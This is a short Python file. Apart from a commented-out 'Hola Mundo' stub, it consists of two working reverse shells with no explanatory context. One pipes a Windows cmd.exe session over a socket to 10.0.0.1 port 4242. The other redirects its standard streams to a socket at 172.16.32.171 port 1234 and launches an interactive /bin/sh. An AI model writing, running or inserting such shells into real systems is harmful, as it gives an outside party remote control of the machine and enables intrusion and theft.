import subprocess
import socket
import os
import threading
import subprocess as sp

#def run():
#    print("Hola Mundo")
#if __name__ == "__main__":
#    run()

def send_output_to_socket():
    while True:
        output = os.read(process.stdout.fileno(), 1024)
        socket_connection.send(output)
 
def receive_input_from_socket():
    while True:
        input_data = socket_connection.recv(1024)
        os.write(process.stdin.fileno(), input_data)
 
if __name__ == "__main__":
    process = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
    socket_connection = socket.socket()
    socket_connection.connect(('10.0.0.1', 4242))
 
    threading.Thread(target=send_output_to_socket, daemon=True).start()
    threading.Thread(target=receive_input_from_socket).start()

#-------

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.16.32.171",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

subprocess.call(["/bin/sh","-i"])
